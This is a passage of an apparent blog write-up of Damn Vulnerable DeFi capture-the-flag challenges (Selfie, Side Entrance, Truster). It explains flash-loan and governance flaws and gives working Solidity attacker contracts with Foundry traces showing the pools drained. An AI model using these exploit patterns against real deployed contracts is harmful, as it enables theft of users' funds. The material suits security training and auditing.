    <span class="s">│   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   ├─ [28685] NaiveReceiverPool::withdraw(1010000000000000000000 [1.01e21], recovery</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x73030B99950fB19C6A813465E58A0BcA5487FBEa</span><span class="pi">]</span><span class="s">) [delegatecall]</span>
    <span class="s">│   │   │   ├─ [25507] WETH::transfer(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], 1010000000000000000000 [1.01e21])</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: recovery</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x73030B99950fB19C6A813465E58A0BcA5487FBEa</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1010000000000000000000 [1.01e21])</span>
    <span class="s">│   │   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   └─ ← [Return] [0x0000000000000000000000000000000000000000000000000000000000000001, 0x0000000000000000000000000000000000000000000000000000000000000001, 0x0000000000000000000000000000000000000000000000000000000000000001, 0x0000000000000000000000000000000000000000000000000000000000000001, 0x0000000000000000000000000000000000000000000000000000000000000001, 0x0000000000000000000000000000000000000000000000000000000000000001, 0x0000000000000000000000000000000000000000000000000000000000000001, 0x0000000000000000000000000000000000000000000000000000000000000001, 0x0000000000000000000000000000000000000000000000000000000000000001, 0x0000000000000000000000000000000000000000000000000000000000000001, 0x]</span>
    <span class="s">│   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">├─ [0] VM::stopPrank()</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [0] VM::getNonce(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] </span><span class="m">0</span>
    <span class="s">├─ [0] VM::assertLe(0, 2) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [825] WETH::balanceOf(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] </span><span class="m">0</span>
    <span class="s">├─ [0] VM::assertEq(0, 0, "Unexpected balance in receiver contract") [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [825] WETH::balanceOf(NaiveReceiverPool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] </span><span class="m">0</span>
    <span class="s">├─ [0] VM::assertEq(0, 0, "Unexpected balance in pool") [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [825] WETH::balanceOf(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] 1010000000000000000000 [1.01e21]</span>
    <span class="s">├─ [0] VM::assertEq(1010000000000000000000 [1.01e21], 1010000000000000000000 [1.01e21], "Not enough WETH in recovery account") [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">└─ ← [Stop]</span>

<span class="na">Suite result</span><span class="pi">:</span> <span class="s">ok. 1 passed; 0 failed; 0 skipped; finished in 41.39ms (13.88ms CPU time)</span>

</code></pre></div></div>

<hr />

<h2 id="selfie-challenge">Selfie Challenge</h2>

<h3 id="challenge-overview-4">Challenge Overview:</h3>
<p>A new lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.</p>

<p>What could go wrong, right ?</p>

<p>You start with no DVT tokens in balance, and the pool has 1.5 million at risk.</p>

<p>Rescue all funds from the pool and deposit them into the designated recovery account.</p>

<p><strong>Simple to understand</strong>:
Exploit a governance system that relies on a snapshot-based token voting mechanism to drain all tokens from the SelfiePool contract.</p>

<p><strong><em>Contracts in this Challenge</em></strong>:</p>

<ol>
  <li>
    <p>DamnValuableVotes (ERC20Votes): ERC20 token with snapshot-based voting power (uses OpenZeppelin’s ERC20Votes).</p>
  </li>
  <li>
    <p>SimpleGovernance: Contract allowing proposals to be queued and executed after a time delay, based on token voting power at the time of queueAction.</p>
  </li>
  <li>
    <p>SelfiePool: A pool that offers ERC3156 flash loans and has emergencyExit(address) function that can be executed by governance.</p>
  </li>
</ol>

<h3 id="vulnerability">Vulnerability:</h3>

<p>The governance system uses snapshot-based voting power, and the snapshot is taken when the queueAction() is called.</p>

<ol>
  <li>
    <p>A user can take a flash loan, temporarily gaining a large amount of governance tokens.</p>
  </li>
  <li>
    <p>During the loan, they delegate votes to themselves and queue a governance action.</p>
  </li>
  <li>
    <p>After the snapshot is taken and the loan is repaid, the user can still execute the queued action after the delay, even though they no longer have the tokens.</p>
  </li>
</ol>

<p>This allows a user to queue a malicious action with temporary voting power gained via flash loan.</p>

<p><strong>VulnerableFunction</strong>:</p>
<pre><code class="language-solidity">function queueAction(address target, uint256 value, bytes calldata data) external returns (uint256 actionId)//when call this function u must have half of the tokens,once u get the power,can make the changes in the contract

</code></pre>

<ol>
  <li>Requires the caller to have enough voting power (from snapshot) to queue.</li>
</ol>

<pre><code class="language-solidity">      //once u have the enough tokens u can get the power,tokens comes from via flashloan
      // u can delegate the token to the pool and get the voting power
        token.delegate(address(this));//this delegate function used to access the power once u have enough tokens
        //after delegate we can call the queueAction function 
</code></pre>

<ol>
  <li>Doesn’t check token balance now, only the balance at snapshot.</li>
</ol>

<h3 id="exploit-strategy-3">Exploit Strategy:</h3>

<ol>
  <li>Deploy a malicious contract (SelfieAttack).</li>
  <li>Take a flash loan of all tokens from the pool.</li>
  <li>Delegate the borrowed tokens’ votes to the attack contract.</li>
  <li>Queue a governance action:
    <pre><code class="language-solidity">pool.emergencyExit(attackerAddress)
</code></pre>
  </li>
  <li>Repay the flash loan.</li>
  <li>Wait for the governance delay (2 days).</li>
  <li>Execute the queued malicious proposal.</li>
</ol>

<h3 id="proof-of-code">Proof Of Code:</h3>
<p><em>**observe this challenge ,exploit using single transation **</em></p>
<pre><code class="language-solidity">//this is the function where i can solve the challenge Damn-Defi-v4-selfie
function test_selfie() public checkSolvedByPlayer {
        SelfieAttack attack = new SelfieAttack(
            recovery,
            address(pool),
            address(governance),
            address(token)
        );
        attack.attack();
        // The attack contract will take a flash loan, delegate the voting power to itself,
        // queue an action to emergency exit the pool, and execute it after the delay.
        // The action will transfer all tokens from the pool to the recovery address.
    }
//SelfieAttack contract which is used to exploit the code
contract SelfieAttack is IERC3156FlashBorrower, Test {
    address public player;
    SelfiePool public pool;
    SimpleGovernance public governance;
    DamnValuableVotes public token;
    uint public actionId;
    bytes32 private constant CALLBACK_SUCCESS =
        keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(
        address _player,
        address _pool,
        address _governance,
        address _token
    ) {
        pool = SelfiePool(_pool);
        player = _player;
        governance = SimpleGovernance(_governance);
        token = DamnValuableVotes(_token);
    }

    function attack() external {
        SelfiePool(pool).flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(token),
            SelfiePool(pool).maxFlashLoan(address(token)),
            ""
        );
        // Execute the action after the delay
        vm.warp(block.timestamp + governance.getActionDelay());
        governance.executeAction(actionId);
    }

    function onFlashLoan(
        address _initiator, //who will call this function,
        address, // address of the token,
        uint256 _amount,
        uint256 _fee,
        bytes calldata //bytes for callback function
    ) external returns (bytes32) {
        require(msg.sender == address(pool), "Only pool can call");
        require(_initiator == address(this), " Initiator is not self");

        // u can delegate the token to the pool and get the voting power
        token.delegate(address(this));
        uint _actionId = governance.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", player)
        );

        actionId = _actionId;
        token.approve(address(pool), _amount + _fee); //approve the pool to withdraw the tokens
        return CALLBACK_SUCCESS;
    }
}

</code></pre>

<h3 id="proof-of-exploit-4">Proof Of Exploit:</h3>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Drain all the funds from Dex contract and send to to the recovery through attacker</span>
<span class="s">nithin@ScateR:~/SCATERLABs/CTFs/Dam-vulnerable-Defi$ forge test --match-test test_selfie -vvvv</span>
<span class="pi">[</span><span class="nv">⠒</span><span class="pi">]</span> <span class="s">Compiling...</span>
<span class="pi">[</span><span class="nv">⠒</span><span class="pi">]</span> <span class="s">Compiling 1 files with Solc 0.8.25</span>
<span class="pi">[</span><span class="nv">⠆</span><span class="pi">]</span> <span class="s">Solc 0.8.25 finished in 1.97s</span>
<span class="s">Compiler run successful!</span>

<span class="s">Ran 1 test for test/selfie/Selfie.t.sol:SelfieChallenge</span>
<span class="pi">[</span><span class="nv">PASS</span><span class="pi">]</span> <span class="na">test_selfie() (gas</span><span class="pi">:</span> <span class="s">2400285)</span>
<span class="na">Traces</span><span class="pi">:</span>
  <span class="pi">[</span><span class="nv">2450485</span><span class="pi">]</span> <span class="s">SelfieChallenge::test_selfie()</span>
    <span class="s">├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x44E97aF4418b7a17AABD8090bEA0A471a366305C</span><span class="pi">]</span><span class="s">)</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [2027380] → new SelfieAttack@0xce110ab5927CC46905460D930CCa0c6fB4666219</span>
    <span class="s">│   └─ ← [Return] 9566 bytes of code</span>
    <span class="s">├─ [367082] SelfieAttack::attack()</span>
    <span class="s">│   ├─ [6747] SelfiePool::maxFlashLoan(DamnValuableVotes: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b]) [staticcall]</span>
    <span class="s">│   │   ├─ [2852] DamnValuableVotes::balanceOf(SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5]) [staticcall]</span>
    <span class="s">│   │   │   └─ ← [Return] 1500000000000000000000000 [1.5e24]</span>
    <span class="s">│   │   └─ ← [Return] 1500000000000000000000000 [1.5e24]</span>
    <span class="s">│   ├─ [309199] SelfiePool::flashLoan(SelfieAttack: [0xce110ab5927CC46905460D930CCa0c6fB4666219], DamnValuableVotes</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">1500000000000000000000000 [1.5e24], 0x)</span>
    <span class="s">│   │   ├─ [33377] DamnValuableVotes::transfer(SelfieAttack: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 1500000000000000000000000 [1.5e24])</span>
    <span class="s">│   │   │   ├─ emit Transfer(from</span><span class="na">: SelfiePool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: SelfieAttack</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1500000000000000000000000 [1.5e24])</span>
    <span class="s">│   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   ├─ [255171] SelfieAttack::onFlashLoan(SelfieAttack: [0xce110ab5927CC46905460D930CCa0c6fB4666219], DamnValuableVotes</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">1500000000000000000000000 [1.5e24], 0, 0x)</span>
    <span class="s">│   │   │   ├─ [71415] DamnValuableVotes::delegate(SelfieAttack: [0xce110ab5927CC46905460D930CCa0c6fB4666219])</span>
    <span class="s">│   │   │   │   ├─ emit DelegateChanged(delegator</span><span class="na">: SelfieAttack</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">fromDelegate</span><span class="pi">:</span> <span class="s">0x0000000000000000000000000000000000000000, toDelegate</span><span class="na">: SelfieAttack</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="s">)</span>
    <span class="s">│   │   │   │   ├─ emit DelegateVotesChanged(delegate</span><span class="na">: SelfieAttack</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">previousVotes</span><span class="pi">:</span> <span class="s">0, newVotes</span><span class="err">:</span> <span class="s">1500000000000000000000000 [1.5e24])</span>
    <span class="s">│   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   ├─ [128147] SimpleGovernance::queueAction(SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 0, 0xa441d06700000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea)</span>
    <span class="s">│   │   │   │   ├─ [1438] DamnValuableVotes::getVotes(SelfieAttack: [0xce110ab5927CC46905460D930CCa0c6fB4666219]) [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 1500000000000000000000000 [1.5e24]</span>
    <span class="s">│   │   │   │   ├─ [2500] DamnValuableVotes::totalSupply() [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 2000000000000000000000000 [2e24]</span>
    <span class="s">│   │   │   │   ├─ emit ActionQueued(actionId</span><span class="err">:</span> <span class="s">1, caller</span><span class="na">: SelfieAttack</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="s">)</span>
    <span class="s">│   │   │   │   └─ ← [Return] </span><span class="m">1</span>
    <span class="s">│   │   │   ├─ [25321] DamnValuableVotes::approve(SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 1500000000000000000000000 [1.5e24])</span>
    <span class="s">│   │   │   │   ├─ emit Approval(owner</span><span class="na">: SelfieAttack</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">spender: SelfiePool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1500000000000000000000000 [1.5e24])</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   └─ ← [Return] 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9</span>
    <span class="s">│   │   ├─ [10856] DamnValuableVotes::transferFrom(SelfieAttack: [0xce110ab5927CC46905460D930CCa0c6fB4666219], SelfiePool</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="s">1500000000000000000000000 [1.5e24])</span>
    <span class="na">│   │   │   ├─ emit Transfer(from: SelfieAttack</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: SelfiePool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1500000000000000000000000 [1.5e24])</span>
    <span class="na">│   │   │   ├─ emit DelegateVotesChanged(delegate: SelfieAttack</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">previousVotes</span><span class="pi">:</span> <span class="s">1500000000000000000000000 [1.5e24], newVotes</span><span class="err">:</span> <span class="s">0)</span>
    <span class="s">│   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   ├─ [310] SimpleGovernance::getActionDelay() [staticcall]</span>
    <span class="s">│   │   └─ ← [Return] 172800 [1.728e5]</span>
    <span class="s">│   ├─ [0] VM::warp(172801 [1.728e5])</span>
    <span class="s">│   │   └─ ← [Return]</span>
    <span class="s">│   ├─ [42855] SimpleGovernance::executeAction(1)</span>
    <span class="na">│   │   ├─ emit ActionExecuted(actionId</span><span class="pi">:</span> <span class="s">1, caller</span><span class="na">: SelfieAttack</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="s">)</span>
    <span class="s">│   │   ├─ [35828] SelfiePool::emergencyExit(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa])</span>
    <span class="s">│   │   │   ├─ [852] DamnValuableVotes::balanceOf(SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5]) [staticcall]</span>
    <span class="s">│   │   │   │   └─ ← [Return] 1500000000000000000000000 [1.5e24]</span>
    <span class="s">│   │   │   ├─ [31377] DamnValuableVotes::transfer(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], 1500000000000000000000000 [1.5e24])</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: SelfiePool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: recovery</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x73030B99950fB19C6A813465E58A0BcA5487FBEa</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1500000000000000000000000 [1.5e24])</span>
    <span class="s">│   │   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="na">│   │   │   ├─ emit EmergencyExit(receiver: recovery</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x73030B99950fB19C6A813465E58A0BcA5487FBEa</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1500000000000000000000000 [1.5e24])</span>
    <span class="s">│   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   └─ ← [Return] 0x</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [0] VM::stopPrank()</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [852] DamnValuableVotes::balanceOf(SelfiePool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] </span><span class="m">0</span>
    <span class="s">├─ [0] VM::assertEq(0, 0, "Pool still has tokens") [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [852] DamnValuableVotes::balanceOf(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] 1500000000000000000000000 [1.5e24]</span>
    <span class="s">├─ [0] VM::assertEq(1500000000000000000000000 [1.5e24], 1500000000000000000000000 [1.5e24], "Not enough tokens in recovery account") [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">└─ ← [Stop]</span>

<span class="na">Suite result</span><span class="pi">:</span> <span class="s">ok. 1 passed; 0 failed; 0 skipped; finished in 5.62ms (2.40ms CPU time)</span>
</code></pre></div></div>

<hr />

<h2 id="sideentrance-challenge">SideEntrance challenge</h2>

<h2 id="challenge-overview-5">Challenge Overview:</h2>
<p>A deceptively simple lending pool allows anyone to:</p>

<ul>
  <li>Deposit ETH.</li>
  <li>Withdraw ETH at any time.</li>
  <li>Take out flash loans with <strong>zero fees</strong> using <strong>deposited ETH</strong>.</li>
</ul>

<blockquote>
  <p>The pool already contains <strong>1000 ETH</strong>, and your account starts with just <strong>1 ETH</strong>.
 Your goal is to <strong>drain all ETH from the pool and deposit it into the provided recovery address</strong>.</p>
</blockquote>

<h2 id="vulnerability-explanation-2">Vulnerability Explanation:</h2>

<p>The contract logic enables an attacker to:</p>

<ol>
  <li><strong>Borrow ETH</strong> through the <code class="language-plaintext highlighter-rouge">flashLoan</code> function.</li>
  <li>Within the <code class="language-plaintext highlighter-rouge">execute()</code> callback (called during the flash loan), <strong>re-deposit</strong> the same borrowed ETH using <code class="language-plaintext highlighter-rouge">deposit()</code>.</li>
  <li>This <strong>satisfies the flash loan repayment check</strong>, even though the attacker still “owns” the deposited ETH via their internal balance.</li>
  <li>After the loan, the attacker calls <code class="language-plaintext highlighter-rouge">withdraw()</code> to <strong>withdraw the same ETH</strong> as if it were theirs.</li>
  <li>Funds are transferred to the attacker and then <strong>forwarded to the recovery account</strong> via the <code class="language-plaintext highlighter-rouge">receive()</code> function.</li>
</ol>

<p>This exploit works because the pool <strong>does not differentiate</strong> between repaying a flash loan and depositing user funds.</p>

<h2 id="vulnerable-code-2">Vulnerable Code:</h2>

<pre><code class="language-solidity">function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();// first this function

        if (address(this).balance &lt; balanceBefore) {
            revert RepayFailed();
        }
    }
    //second withdraw function:
    function withdraw() external {
        uint256 amount = balances[msg.sender];

        delete balances[msg.sender];
        emit Withdraw(msg.sender, amount);

        SafeTransferLib.safeTransferETH(msg.sender, amount); //it looks like call function and  no calldata==&gt;go to the recevier function 
    }

</code></pre>

<h2 id="exploiter-strategy-1">Exploiter Strategy:</h2>

<p>1.Deploy an attacker contract with access to the pool and recovery address.</p>

<p>2.Call flashLoan() to borrow the full balance.</p>

<p>3.In execute(), re-deposit the borrowed ETH back into the pool.</p>

<p>4.The loan is considered repaid due to the balance check.</p>

<p>5.Call withdraw() to drain the ETH.</p>

<p>When ETH is sent via .call, receive() forwards all funds to the recovery account.</p>

<h3 id="exploit-code-3">Exploit Code:</h3>
<pre><code class="language-solidity">// call the attacker contract
function test_sideEntrance() public checkSolvedByPlayer {
        SideAttranceAttack attack = new SideAttranceAttack(
            address(pool),
            recovery
        );
        attack.Attack();
    }


//Attacker Contract
contract SideAttranceAttack {
    address public pool;
    address public recovery;

    constructor(address _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    function Attack() external {
        SideEntranceLenderPool(pool).flashLoan(address(pool).balance);//borrower initating falshLoan
        SideEntranceLenderPool(pool).withdraw(); //after the flashLoan,withdraw all the ether in the pool --&gt;recovery Account
    }

    
    function execute() external payable {
        SideEntranceLenderPool(pool).deposit{value: msg.value}();// deposit back to the pool through deposit function
    }

    receive() external payable {
        payable(recovery).transfer(msg.value);//transfer to the recovery Account
    }
}
</code></pre>
<h3 id="proof-of-exploit-5">Proof Of Exploit:</h3>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">Ran 1 test for test/side-entrance/SideEntrance.t.sol:SideEntranceChallenge</span>
<span class="pi">[</span><span class="nv">PASS</span><span class="pi">]</span> <span class="na">test_sideEntrance() (gas</span><span class="pi">:</span> <span class="s">347842)</span>
<span class="na">Traces</span><span class="pi">:</span>
  <span class="pi">[</span><span class="nv">367742</span><span class="pi">]</span> <span class="s">SideEntranceChallenge::test_sideEntrance()</span>
    <span class="s">├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x44E97aF4418b7a17AABD8090bEA0A471a366305C</span><span class="pi">]</span><span class="s">)</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [235535] → new SideAttranceAttack@0xce110ab5927CC46905460D930CCa0c6fB4666219</span>
    <span class="s">│   └─ ← [Return] 952 bytes of code</span>
    <span class="s">├─ [86321] SideAttranceAttack::Attack()</span>
    <span class="s">│   ├─ [38751] SideEntranceLenderPool::flashLoan(1000000000000000000000 [1e21])</span>
    <span class="s">│   │   ├─ [31244] SideAttranceAttack::execute{value: 1000000000000000000000}()</span>
    <span class="s">│   │   │   ├─ [23951] SideEntranceLenderPool::deposit{value: 1000000000000000000000}()</span>
    <span class="s">│   │   │   │   ├─ emit Deposit(who</span><span class="na">: SideAttranceAttack</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000000 [1e21])</span>
    <span class="s">│   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   └─ ← [Stop]</span>
    <span class="s">│   ├─ [43561] SideEntranceLenderPool::withdraw()</span>
    <span class="s">│   │   ├─ emit Withdraw(who</span><span class="na">: SideAttranceAttack</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000000 [1e21])</span>
    <span class="s">│   │   ├─ [34590] SideAttranceAttack::receive{value: 1000000000000000000000}()</span>
    <span class="s">│   │   │   ├─ [0] recovery::fallback{value: 1000000000000000000000}()</span>
    <span class="s">│   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   └─ ← [Stop]</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [0] VM::stopPrank()</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [0] VM::assertEq(0, 0, "Pool still has ETH") [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [0] VM::assertEq(1000000000000000000000 [1e21], 1000000000000000000000 [1e21], "Not enough ETH in recovery account") [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">└─ ← [Stop]</span>

<span class="na">Suite result</span><span class="pi">:</span> <span class="s">ok. 1 passed; 0 failed; 0 skipped; finished in 5.78ms (757.72µs CPU time)</span>

<span class="na">Ran 1 test suite in 1.61s (5.78ms CPU time)</span><span class="pi">:</span> <span class="s">1 tests passed, 0 failed, 0 skipped (1 total tests)</span>

<span class="na">Simple Understanding Case</span><span class="pi">:</span>
<span class="pi">[</span><span class="nv">PASS</span><span class="pi">]</span> <span class="na">test_sideEntrance() (gas</span><span class="pi">:</span> <span class="s">347842)</span>
<span class="na">Traces</span><span class="pi">:</span>
  <span class="s">SideAttranceAttack::Attack()</span>
    <span class="s">├─ flashLoan(1000 ETH)</span>
    <span class="s">│   └─ execute{value</span><span class="err">:</span> <span class="s">1000 ETH} → deposit()</span>
    <span class="s">└─ withdraw() → receive() → forward to recovery</span> 

<span class="s">assertEq(Pool.balance, 0)</span> 
<span class="s">assertEq(Recovery.balance, 1000 ETH)</span> 
</code></pre></div></div>

<hr />

<h1 id="truster-challenge">Truster Challenge</h1>

<h3 id="challenge">Challenge:</h3>
<p>More and more lending pools are offering flashloans. In this case, a new pool has launched that is offering flashloans of DVT tokens for free.</p>

<p>The pool holds 1 million DVT tokens. You have nothing.</p>

<p>To pass this challenge, <strong>rescue all funds in the pool executing a single transaction</strong>. Deposit the funds into the designated recovery account.</p>

<h4 id="smart-contract-">Smart Contract :</h4>
<p>TrusterLender Pool: Offering flash loans of DVT tokens for free</p>

<h3 id="vulnerability-explained">Vulnerability Explained:</h3>

<p>In this Pool, the flash loan function is calling <code class="language-plaintext highlighter-rouge">target.functionCall(data)</code> in a low-level manner. The function call uses data that can be manipulated by an attacker to drain all the funds.</p>

<h3 id="vulnerable-code-3">Vulnerable Code:</h3>
<pre><code class="language-solidity">function flashLoan(
    uint256 amount,
    address borrower,
    address target,
    bytes calldata data
) external nonReentrant returns (bool) {
    uint256 balanceBefore = token.balanceOf(address(this));

    token.transfer(borrower, amount);
    target.functionCall(data); // Vulnerable is here, I smell it

    if (token.balanceOf(address(this)) &lt; balanceBefore) {
        revert RepayFailed();
    }

    return true;
}
</code></pre>
<h3 id="exploit-strategy-4">Exploit strategy:</h3>
<p>The attack strategy involves calling the approve function to grant the attacker permission to withdraw all tokens from the pool. The data is crafted using abi.encodeWithSignature(“approve(address,uint256)”, address(this), TOKENS_IN_POOL), which approves the attacker to transfer all the tokens from the pool. After approval, the attacker uses transferFrom to move the tokens to the recovery account.</p>

<h3 id="exploit-code-4">Exploit Code:</h3>
<pre><code class="language-solidity">function test_truster() public checkSolvedByPlayer {
    new TrusterExploiter(pool, token, recovery, TOKENS_IN_POOL);
}

// Exploiter Contract:
contract TrusterExploiter {
    constructor(
        TrusterLenderPool pool,
        DamnValuableToken token,
        address recovery,
        uint256 TOKENS_IN_POOL
    ) {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            TOKENS_IN_POOL
        );
        pool.flashLoan(0, address(this), address(token), data);
        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
    }
}

</code></pre>
<h3 id="proof-of-exploit-6">Proof of Exploit:</h3>
<p>Check that the test case can easily understand the exploit:</p>
<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">Ran 1 test for test/truster/Truster.t.sol:TrusterChallenge</span>
<span class="pi">[</span><span class="nv">PASS</span><span class="pi">]</span> <span class="na">test_truster() (gas</span><span class="pi">:</span> <span class="s">112277)</span>
